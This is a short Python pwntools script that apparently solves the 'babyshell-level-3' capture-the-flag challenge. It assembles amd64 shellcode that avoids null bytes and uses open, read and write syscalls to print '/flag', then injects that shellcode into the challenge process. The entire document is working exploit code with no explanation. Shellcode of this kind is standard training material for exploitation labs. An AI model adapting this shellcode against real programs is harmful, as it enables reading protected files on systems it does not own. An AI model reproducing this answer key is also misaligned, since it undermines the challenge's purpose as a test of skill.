from pwn import *

p = process('/challenge/babyshell-level-3', aslr=False)
context.update(arch="amd64")

shellcode = asm('''
        xor rsi, rsi
        xor rax, rax
        push rax
        mov rbx, 0x67616c66 #flag
        shl rbx, 8
        mov bl, 0x2f #/
        push rbx

        mov rdi, rsp
        mov al, 2
        syscall

        mov rdi, rax
        mov rsi, rsp
        xor rdx, rdx
        mov dl,100
        xor rax, rax
        syscall

        xor rdi, rdi
        mov dil, 1
        mov rsi, rsp
        mov rdx, rax
        xor rax, rax
        inc rax
        syscall

        xor rax,rax
        mov al, 60
        xor rdi, rdi
        mov dil, 42
        syscall
''')

p.send(shellcode)
p.interactive()
